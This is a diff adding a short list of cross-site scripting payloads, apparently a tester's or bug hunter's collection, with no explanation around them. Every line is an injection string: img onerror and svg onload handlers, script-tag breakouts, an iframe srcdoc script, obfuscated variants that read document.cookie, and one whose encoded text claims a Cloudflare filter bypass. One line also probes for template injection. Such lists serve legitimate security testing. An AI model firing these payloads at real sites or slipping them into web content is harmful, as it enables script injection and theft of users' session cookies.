@@ -1,0 +1,12 @@
+<img src="x` `<script>javascript:alert(1)</script>"` `>
+"><ing src=x oneroor=alert(document.domain);>
+<img src=x onerror=alert("0x0sadat")>
+<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
+"><img src onerror=alert(cookie)>{7*7}
+<iframe srcdoc="<script>alert(12)</script>"></iframe>
+<img src="a" id="confirm(1)" onerror="eval(id);">
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))
+<script>alert(1)</script>
+}}})</script><script>alert(1)</script>
+"><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
+'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->/
